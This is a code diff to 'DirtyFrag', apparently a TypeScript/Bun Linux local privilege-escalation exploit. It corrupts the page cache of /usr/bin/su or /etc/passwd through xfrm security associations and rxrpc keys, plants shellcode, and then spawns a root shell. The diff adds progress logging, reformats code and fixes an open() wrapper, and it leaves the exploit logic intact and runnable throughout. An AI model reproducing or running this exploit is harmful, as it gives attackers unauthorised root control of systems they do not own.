@@ -7,6 +7,8 @@
  */
 
 import { dlopen, FFIType, ptr, CString, toBuffer } from "bun:ffi";
+import { performance } from "node:perf_hooks";
+import process from "node:process";
 
 // ── FFI ───────────────────────────────────────────────────────────────────────
 
@@ -181,44 +183,59 @@ export const { symbols: C } = dlopen("libc.so.6", {
   execlp: {
     returns: FFIType.i32,
     args: [
-      FFIType.cstring, FFIType.cstring,
-      FFIType.cstring, FFIType.cstring,
+      FFIType.cstring,
+      FFIType.cstring,
+      FFIType.cstring,
+      FFIType.cstring,
       FFIType.ptr,
     ],
   },
   // execl(path, arg0, arg1, arg2, NULL) — covers 0..3 real args
   execl: {
     returns: FFIType.i32,
-    args: [
-      FFIType.cstring, FFIType.cstring,
-      FFIType.cstring, FFIType.ptr,
-    ],
-  },
-
-  // ---- dprintf(fd, fmt, int_arg) ----
-  dprintf: {
-    returns: FFIType.i32,
-    args: [FFIType.i32, FFIType.cstring, FFIType.i32],
+    args: [FFIType.cstring, FFIType.cstring, FFIType.cstring, FFIType.ptr],
   },
 });
 
 // Two separate dlopens for syscall — same symbol, different arg layouts.
 // Bun FFI requires the key name to match the actual exported symbol, so we
 // destructure each `syscall` into an alias at import time.
-const { symbols: { syscall: _sysAddKeyRaw } } = dlopen("libc.so.6", {
+const {
+  symbols: { syscall: _sysAddKeyRaw },
+} = dlopen("libc.so.6", {
   syscall: {
     returns: FFIType.i64,
-    args: [FFIType.i64, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.u64, FFIType.i32],
+    args: [
+      FFIType.i64,
+      FFIType.ptr,
+      FFIType.ptr,
+      FFIType.ptr,
+      FFIType.u64,
+      FFIType.i32,
+    ],
   },
 });
 export function sysAddKey(
-  nr: bigint, type: Buffer, desc: Buffer, payload: Buffer,
-  plen: bigint, ringid: number,
+  nr: bigint,
+  type: Buffer,
+  desc: Buffer,
+  payload: Buffer,
+  plen: bigint,
+  ringid: number,
 ): bigint {
-  return _sysAddKeyRaw(nr, ptr(type), ptr(desc), ptr(payload), plen, ringid) as bigint;
+  return _sysAddKeyRaw(
+    nr,
+    ptr(type),
+    ptr(desc),
+    ptr(payload),
+    plen,
+    ringid,
+  ) as bigint;
 }
 
-const { symbols: { syscall: _sysKeyctlRaw } } = dlopen("libc.so.6", {
+const {
+  symbols: { syscall: _sysKeyctlRaw },
+} = dlopen("libc.so.6", {
   syscall: {
     returns: FFIType.i64,
     args: [FFIType.i64, FFIType.i32, FFIType.i64],
@@ -451,9 +468,17 @@ export function cstr(s: string): Buffer {
   return Buffer.from(s + "\0", "latin1");
 }
 
-/** open() wrapper that handles string → Buffer encoding. */
+// Save a direct alias to the raw FFI open before any wrapping.
+const _openFFI = C.open;
+
+/** open() wrapper — encodes string path to Buffer for the FFI cstring arg. */
 export function openFd(path: string, flags: number, mode = 0): number {
-  return openFd(cstr(path), flags, mode) as number;
+  return _openFFI(cstr(path), flags, mode) as number;
+}
+
+// stdout progress helper — visible even when stderr is redirected to /dev/null
+export function progress(msg: string): void {
+  process.stdout.write(`[>>] ${msg}\n`);
 }
 
 export function getEnv(name: string): string | null {
@@ -565,6 +590,7 @@ function writeProc(path: string, content: string): number {
 function setupUsernsNetns(): void {
   const realUid = C.getuid() as number;
   const realGid = C.getgid() as number;
+  progress(`setupUsernsNetns: uid=${realUid} gid=${realGid}`);
 
   if ((C.unshare(CLONE_NEWUSER | CLONE_NEWNET) as number) < 0) {
     SLOG(`unshare: ${errStr()}`);
@@ -853,12 +879,13 @@ function verifyByte(path: string, offset: number, want: number): number {
 // ── corrupt_su ────────────────────────────────────────────────────────────────
 
 function corruptSu(): number {
+  progress("corruptSu: unshare user+net namespace...");
   setupUsernsNetns();
   C.usleep(100 * 1000);
 
   const count = PAYLOAD_LEN / 4; // 48 SAs
+  progress(`corruptSu: installing ${count} xfrm SAs...`);
 
-  // Install one xfrm SA per 4-byte chunk; seq_hi carries the payload word
   for (let i = 0; i < count; i++) {
     const spi = (0xdeadbe10 + i) >>> 0;
     const seqhi =
@@ -868,23 +895,22 @@ function corruptSu(): number {
         SHELL_ELF[i * 4 + 3]) >>>
       0;
     if (addXfrmSa(spi, seqhi) < 0) {
-      SLOG(`add_xfrm_sa #${i} failed`);
+      progress(`corruptSu: add_xfrm_sa #${i} FAILED`);
       return -1;
     }
   }
-  SLOG(`installed ${count} xfrm SAs`);
+  progress(`corruptSu: ${count} SAs installed, triggering writes...`);
 
   for (let i = 0; i < count; i++) {
     const spi = (0xdeadbe10 + i) >>> 0;
     const off = PATCH_OFFSET + i * 4;
     if (doOneWrite(TARGET_PATH, off, spi) < 0) {
-      SLOG(`do_one_write #${i} at off=0x${off.toString(16)} failed`);
+      progress(`corruptSu: doOneWrite #${i} @ 0x${off.toString(16)} FAILED`);
       return -1;
     }
+    if (i % 16 === 15) progress(`corruptSu: write ${i + 1}/${count} done`);
   }
-  SLOG(
-    `wrote ${PAYLOAD_LEN} bytes to ${TARGET_PATH} at 0x${PATCH_OFFSET.toString(16)}`,
-  );
+  progress(`corruptSu: wrote ${PAYLOAD_LEN} bytes to ${TARGET_PATH}`);
   return 0;
 }
 
@@ -896,22 +922,27 @@ export function suLpeMain(argv: string[]): number {
   }
   if (getEnv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
 
+  progress("suLpeMain: forking corruption child...");
   const cpid = C.fork() as number;
-  if (cpid < 0) return 1;
+  if (cpid < 0) {
+    progress("suLpeMain: fork failed");
+    return 1;
+  }
 
   if (cpid === 0) {
-    // child: do the corruption
     const rc = corruptSu();
     C._exit(rc === 0 ? 0 : 2);
   }
 
+  progress(`suLpeMain: waiting for child pid=${cpid}...`);
   const cstatus = Buffer.alloc(4, 0);
   C.waitpid(cpid, ptr(cstatus), 0);
   const st = cstatus.readInt32LE(0);
   if (!WIFEXITED(st) || WEXITSTATUS(st) !== 0) {
-    SLOG(`corruption stage failed (status=0x${st.toString(16)})`);
+    progress(`suLpeMain: child failed (status=0x${st.toString(16)})`);
     return 1;
   }
+  progress("suLpeMain: child exited OK, verifying patch...");
 
   // Verify: first two bytes of shellcode entry (0x31 0xff = xor edi,edi)
   if (
@@ -1059,7 +1090,14 @@ function keyAdd(
 ): bigint {
   const typeBuf = Buffer.from(type + "\0", "ascii");
   const descBuf = Buffer.from(desc + "\0", "ascii");
-  return sysAddKey(SYS_ADD_KEY, typeBuf, descBuf, payload, BigInt(payload.length), ringid);
+  return sysAddKey(
+    SYS_ADD_KEY,
+    typeBuf,
+    descBuf,
+    payload,
+    BigInt(payload.length),
+    ringid,
+  );
 }
 
 export function addRxrpcKey(desc: string): bigint {
@@ -2070,7 +2108,7 @@ function runRootPty(): number {
   C.signal(SIGTTOU, 1);
   C.signal(SIGTTIN, 1);
   C.signal(SIGPIPE, 1);
-  C.signal(SIGHUP,  1);
+  C.signal(SIGHUP, 1);
   C.setpgid(0, 0);
   C.tcsetpgrp(STDIN_FILENO, C.getpid() as number);
 
@@ -2248,6 +2286,7 @@ export function rxrpcLpeMain(argv: string[]): number {
   C.pread64(rfdRo, ptr(tmpC), 8n, BigInt(offC));
   Cc.set(tmpC);
 
+  progress("rxrpc: initialising fcrypt S-boxes...");
   fcryptInitSboxes();
 
   // selftest
@@ -2267,6 +2306,9 @@ export function rxrpcLpeMain(argv: string[]): number {
   const seStr = getEnv("LPE_SEED");
   if (seStr) seedBase = BigInt(seStr);
 
+  progress(
+    `rxrpc: brute-force maxIters=${maxIters} seed=0x${seedBase.toString(16)}`,
+  );
   process.stderr.write(
     '\n=== STAGE 1a: search K_A (chars 4-5 := "::")  prob ~1.5e-5 ===\n',
   );
@@ -2416,7 +2458,13 @@ export function rxrpcLpeMain(argv: string[]): number {
         C.dup2(pw, 1);
         C.dup2(pw, 2);
         C.close(pw);
-        C.execlp(cstr("getent"), cstr("getent"), cstr("passwd"), cstr("root"), null);
+        C.execlp(
+          cstr("getent"),
+          cstr("getent"),
+          cstr("passwd"),
+          cstr("root"),
+          null,
+        );
         C._exit(127);
       }
       C.close(pw);
@@ -2576,40 +2624,63 @@ export function main(argv: string[]): number {
     else if (a === "-v" || a === "--verbose") verbose = true;
   }
 
+  progress(`uid=${C.getuid()} euid=${C.geteuid()} pid=${C.getpid()}`);
+  progress(
+    `flags: verbose=${verbose} force-esp=${forceEsp} force-rxrpc=${forceRxrpc}`,
+  );
+
   // already root — just drop into bash
   if ((C.getuid() as number) === 0) {
+    progress("already root — exec /bin/bash");
     C.execlp(cstr("/bin/bash"), cstr("bash"), null, null, null);
     C._exit(1);
   }
 
   const coArgv = [...argv, "--corrupt-only"];
-
   if (!verbose) savedErr = silenceStderr();
 
   if (forceRxrpc) {
+    progress("path: rxrpc only");
     rc = rxrpcLpeMain(coArgv);
-    for (let i = 0; !passwdAlreadyPatched() && i < 3; i++)
+    for (let i = 0; !passwdAlreadyPatched() && i < 3; i++) {
+      progress(`rxrpc retry ${i + 1}/3`);
       rc = rxrpcLpeMain(coArgv);
+    }
   } else if (forceEsp) {
+    progress("path: ESP (xfrm) only");
     rc = suLpeMain(coArgv);
+    progress(`suLpeMain returned rc=${rc}`);
   } else {
+    progress("path: ESP (xfrm) first, rxrpc fallback");
+    progress("stage ESP: corrupting /usr/bin/su page-cache...");
     rc = suLpeMain(coArgv);
+    progress(`suLpeMain returned rc=${rc}, su_patched=${suAlreadyPatched()}`);
     if (!suAlreadyPatched()) {
+      progress("ESP did not patch su — falling back to rxrpc");
       rc = rxrpcLpeMain(coArgv);
-      for (let i = 0; !passwdAlreadyPatched() && i < 3; i++)
+      progress(
+        `rxrpcLpeMain returned rc=${rc}, passwd_patched=${passwdAlreadyPatched()}`,
+      );
+      for (let i = 0; !passwdAlreadyPatched() && i < 3; i++) {
+        progress(`rxrpc retry ${i + 1}/3`);
         rc = rxrpcLpeMain(coArgv);
+        progress(`  rc=${rc} passwd_patched=${passwdAlreadyPatched()}`);
+      }
     }
   }
 
   const patched = eitherTargetPatched();
   if (!verbose) restoreStderr(savedErr);
 
+  progress(`done — patched=${patched} rc=${rc}`);
+
   if (patched) {
+    progress("spawning root PTY...");
     runRootPty();
     return 0;
   }
 
-  C.dprintf(2, cstr("dirtyfrag: failed (rc=%d)\n"), rc);
+  process.stderr.write(`dirtyfrag: failed (rc=${rc})\n`);
   return rc !== 0 ? rc : 1;
 }
 
@@ -2617,6 +2688,9 @@ export function main(argv: string[]): number {
 
 // Bun top-level: only run when executed directly (not imported)
 if (import.meta.main) {
+  progress(
+    `DirtyFrag TS starting — Bun ${Bun.version} args=[${process.argv.slice(2).join(",")}]`,
+  );
   process.exit(main(process.argv.slice(2)));
 }
 
@@ -2660,11 +2734,12 @@ export function findKOfflineGeneric(
       return { K: K.slice(), P };
     }
 
-    if ((iter & 0x3ffffffn) === 0n && iter > 0n) {
+    // Log every ~500k iterations (JS BigInt is ~30-50x slower than C)
+    if ((iter & 0x7ffffn) === 0n && iter > 0n) {
       const dt = (performance.now() - t0) / 1000;
       const mps = (Number(iter) / dt / 1e6).toFixed(2);
-      process.stderr.write(
-        `  [${label} ${dt.toFixed(1)}s] iter=${iter} (${mps}M/s)\n`,
+      progress(
+        `${label}: iter=${iter} elapsed=${dt.toFixed(1)}s speed=${mps}M/s`,
       );
     }
   }
